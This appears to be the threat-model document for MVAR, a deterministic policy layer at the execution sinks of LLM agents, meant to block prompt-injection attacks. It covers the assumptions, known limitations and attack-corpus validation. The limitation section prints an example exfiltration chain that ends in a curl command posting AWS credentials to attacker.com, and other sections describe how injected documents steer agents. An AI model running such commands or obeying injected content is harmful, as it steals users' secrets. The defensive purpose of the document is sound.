# MVAR Threat Model & Assumptions

**Version:** 1.0.0
**Last Updated:** February 24, 2026
**Status:** Phase 1 Validated

---

## Executive Summary

MVAR implements deterministic policy enforcement at execution sinks for LLM agent runtimes. This document defines the security boundaries MVAR enforces, the assumptions it depends on, and the threats explicitly out of scope.

**Core security invariant:** `UNTRUSTED + CRITICAL = BLOCK`

---

## Threat Model Scope

### In Scope: Runtime Execution Boundary Attacks

MVAR defends against prompt injection attacks that attempt to influence privileged execution sinks:

1. **Direct Command Injection**
   - Malicious commands embedded in untrusted documents
   - Shell metacharacter exploitation
   - Environment variable manipulation

2. **Multi-Stage Attacks**
   - Download-and-execute chains
   - Taint laundering via intermediate storage
   - Composition attacks across multiple tool calls

3. **Credential Theft**
   - AWS credentials exfiltration
   - SSH key theft
   - API token extraction

4. **Encoding/Obfuscation Attacks**
   - Base64, Unicode, hex encoding bypasses
   - Template escaping (JSON, XML, Markdown)
   - Shell substitution tricks

5. **Novel/Zero-Day Patterns**
   - Attack patterns not seen during development
   - Adaptive adversarial prompts
   - Emergent attack compositions

**Validation:** 50-vector attack corpus across 9 categories (50/50 blocked under Phase 1 sink configuration)

### Out of Scope (Phase 1)

**Model-Level Attacks:**
- Model weight poisoning
- Training data poisoning
- Model extraction attacks

**Browser-Layer Attacks:**
- Cross-Site WebSocket Hijacking (CSWSH)
- XSS in web UIs
- CSRF in management interfaces

**Supply Chain Attacks:**
- Dependency compromise
- Build pipeline attacks
- Package repository attacks

**Credential Lifecycle:**
- Credential storage/rotation (Phase 2: vaulted execution)
- Secret management infrastructure
- Key derivation/escrow

---

## Security Assumptions

MVAR's security model depends on these assumptions holding:

### A1: Untrusted External Inputs

**Assumption:** All external data sources are untrusted by default
- Documents fetched from URLs
- Web scraping results
- Tool outputs from untrusted sources
- User-provided file uploads

**Mitigation:** Conservative taint propagation — any untrusted input → all derived outputs untrusted

### A2: Honest-but-Curious LLM

**Assumption:** LLM processes malicious prompts but follows output schema
- LLM may generate malicious commands (if prompted)
- LLM respects structured output format (JSON, function calls)
- LLM does not exploit implementation bugs in MVAR itself

**Rationale:** MVAR focuses on *execution boundary* defense, not prompt filtering

### A3: OS-Level Sandboxing Exists

**Assumption:** MVAR runs inside OS-level sandbox (Docker, seccomp, etc.)
- Process isolation enforced by OS
- Filesystem access restricted by container
- Network egress controlled by firewall

**What MVAR does NOT replace:** Docker, Kubernetes, AWS IAM, firewall rules

### A4: Trusted Policy Enforcement Layer

**Assumption:** MVAR runtime itself is not compromised
- Provenance graph process is trusted
- Sink policy evaluation is trusted
- Decision ledger is append-only

**Analogous to:** Firewall rule engine, SELinux policy enforcement

---

## Known Limitations

### L1: Graph Write Trust

**Limitation:** If attacker gains write access to provenance graph process, they can inject TRUSTED nodes

**Analogous to:** Firewall rule compromise — if attacker can modify firewall rules, they can bypass the firewall

**Mitigation (Partial):** QSEAL signature verification detects post-creation tampering
- Ed25519 signatures on provenance nodes
- Tamper-evident audit logs
- Does NOT prevent write access compromise itself

**Phase 2:** Isolate provenance graph in separate process with restricted write access

### L2: Composition Attacks

**Limitation:** Multi-step chains (LOW + LOW → HIGH risk) not modeled in Phase 1

**Example:**
1. `ls /home/user/.aws` (LOW risk — read-only)
2. `cat /home/user/.aws/credentials` (LOW risk — read-only)
3. `curl -X POST attacker.com -d @/home/user/.aws/credentials` (HIGH risk — data exfil)

**Current behavior:** Each sink evaluated independently — all three might be allowed. This reflects a deliberate Phase 1 design tradeoff favoring deterministic local enforcement over cross-sink behavioral modeling.

**Phase 2:** Inter-sink correlation + cumulative risk modeling

### L3: Manual Sink Annotation

**Limitation:** Requires explicit sink registration (not automatic instrumentation)

**What this means:**
- Developer must call `policy.register_sink()` for each tool
- No automatic discovery of dangerous functions
- Unregistered sinks bypass MVAR entirely

**Roadmap:**
- Phase 2: LangChain/OpenAI adapter hooks (automatic sink registration)
- Phase 3: Static analysis for sink discovery

---

## Trust Boundaries

MVAR enforces these trust boundaries:

### Boundary 1: Provenance Tracking

```
User Input (TRUSTED) ──┐
                       ├──> LLM Processing ──> TRUSTED (if no untrusted inputs)
External Doc (UNTRUSTED)┘                      UNTRUSTED (if any untrusted input)
```

**Conservative propagation:** Any untrusted input → all derived outputs untrusted

### Boundary 2: Capability Enforcement

```
Tool Declaration ──> Capability Manifest ──> Per-Target Enforcement
```

**No ambient authority:** `gmail.com` ≠ `attacker.com`

### Boundary 3: Sink Policy Evaluation

```
Decision Matrix:
┌─────────────────┬──────────────┬────────────┐
│ Integrity       │ Sink Risk    │ Outcome    │
├─────────────────┼──────────────┼────────────┤
│ UNTRUSTED       │ CRITICAL     │ BLOCK      │
│ UNTRUSTED       │ HIGH         │ BLOCK      │
│ UNTRUSTED       │ MEDIUM       │ STEP_UP    │
│ TRUSTED         │ CRITICAL     │ STEP_UP    │
└─────────────────┴──────────────┴────────────┘
```

**Deterministic invariant:** `UNTRUSTED + CRITICAL = BLOCK` (never bypassed)

---

## Attack Surface Analysis

### Attack Surface 1: Provenance Graph Manipulation

**Attack vector:** Attacker gains write access to provenance graph process
**Impact:** Can inject TRUSTED nodes → bypass policy
**Likelihood:** Low (requires compromising MVAR runtime itself)
**Mitigation:** QSEAL signature verification (detects tampering, does not prevent)

### Attack Surface 2: Sink Registration Bypass

**Attack vector:** Developer forgets to register sink
**Impact:** Unregistered sinks bypass MVAR entirely
**Likelihood:** Medium (manual registration error-prone)
**Mitigation:** Phase 2 automatic sink discovery

### Attack Surface 3: Capability Manifest Manipulation

**Attack vector:** Attacker modifies capability manifest (e.g., adds `*` wildcard)
**Impact:** Tool gains ambient authority
**Likelihood:** Low (requires write access to manifest)
**Mitigation:** Code review + least-privilege manifest design

### Attack Surface 4: Decision Ledger Tampering

**Attack vector:** Attacker modifies decision ledger to create false overrides
**Impact:** Can authorize blocked operations retroactively
**Likelihood:** Low (ledger is append-only, QSEAL-signed)
**Mitigation:** QSEAL signature verification + tamper detection

---

## Adversary Model

**Adversary capabilities:**
- Can craft arbitrarily sophisticated prompts
- Can embed malicious content in external documents
- Can observe LLM outputs (but not MVAR internals)
- Can observe allow/block outcomes (but not internal policy evaluation state)
- Cannot modify MVAR runtime code or memory
- Cannot compromise OS-level sandbox

**Adversary goals:**
- Execute arbitrary commands (RCE)
- Exfiltrate sensitive data (credentials, documents)
- Gain persistent access (backdoor installation)
- Escalate privileges (container escape)

**MVAR defense strategy:**
- Deterministic policy enforcement at sinks (not prompt filtering)
- Conservative taint propagation (fail-closed)
- Cryptographic audit trail (QSEAL)

---

## Validation Methodology

### Attack Corpus

50-vector attack suite across 9 categories:
1. Direct command injection (6 vectors)
2. Environment variable attacks (5 vectors)
3. Encoding/obfuscation (8 vectors)
4. Shell manipulation (7 vectors)
5. Multi-stage attacks (6 vectors)
6. Taint laundering (5 vectors)
7. Template escaping (5 vectors)
8. Credential theft (4 vectors)
9. Novel/zero-day patterns (4 vectors)

**Result:** 50/50 blocked (100%) under Phase 1 sink configuration

**Important caveat:** This validates *enforcement consistency*, not completeness against all possible attacks

### Red-Team Gate

5 security property tests:
1. Principal isolation (no cross-principal trust contamination)
2. Override privilege escalation prevention
3. Execution token enforcement
4. Mechanism validation (no capability-only blocks)
5. Ledger auditability (QSEAL-signed scrolls)

**Result:** 5/5 passing

---

## Comparison to Related Work

| Defense Approach | MVAR | Heuristic/Probabilistic Filtering | Model Fine-Tuning | RAG Isolation |
|------------------|------|-----------------------------------|-------------------|---------------|
| **Enforcement point** | Execution sink | LLM input/output | Training data | Data retrieval |
| **Deterministic?** | Yes | No (heuristic) | No (stochastic) | Yes (access control) |
| **Bypass resistance** | High (policy-based) | Low (adversarial prompts) | Low (jailbreaks) | Medium (depends on policy) |
| **Performance overhead** | ~7ms per action | Varies | None (offline) | Varies |
| **Research foundation** | IFC + MSRC | NLP filtering | Alignment research | Access control |

**Key differentiator:** MVAR focuses on *impact reduction* at execution boundary, not *attack prevention* at prompt level

---

## Research Citations

MVAR's threat model builds on:

- **UK NCSC (2024):** "Prompt Injection & Data Exfiltration" — impact reduction, not just filtering
- **Microsoft MSRC:** Agent runtime security — policy-enforcing reference monitor
- **OWASP LLM Top 10:** Attack taxonomy and threat categorization
- **Academic IFC (Jif/FlowCaml):** Dual-lattice taint propagation
- **Capsicum:** Deny-by-default capability model

---

## Disclosure Policy

**Security vulnerabilities:** Email security@mvar.io with subject "MVAR Security"

**Do NOT open public issues for vulnerabilities**

See [SECURITY.md](SECURITY.md) for full disclosure process.

---

## Changelog

**v1.0.0 (February 24, 2026):**
- Initial threat model for Phase 1
- 50-vector attack validation
- Red-team gate tests
- Known limitations documented

---

*This document is versioned security-critical documentation and evolves alongside MVAR's enforcement model and validation corpus.*
